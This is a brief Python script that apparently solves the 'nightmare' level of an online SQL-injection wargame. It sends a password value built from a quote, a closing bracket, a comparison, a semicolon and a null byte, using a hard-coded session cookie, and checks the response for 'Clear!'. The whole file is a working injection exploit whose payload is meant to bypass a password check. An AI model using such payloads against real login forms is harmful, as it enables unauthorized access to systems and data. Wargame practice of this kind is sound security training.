import requests

url = "https://los.rubiya.kr/chall/nightmare_be1285a95aa20e8fa154cb977c37fee5.php/"
cookie = {"PHPSESSID" : "tibb2rs3ofa7rjdogjml4vbvd6"}

if requests.get(url, {"pw":"')=0;"+"\x00"}, cookies=cookie).text.find("Clear!") > 0 : print("[*] Success")
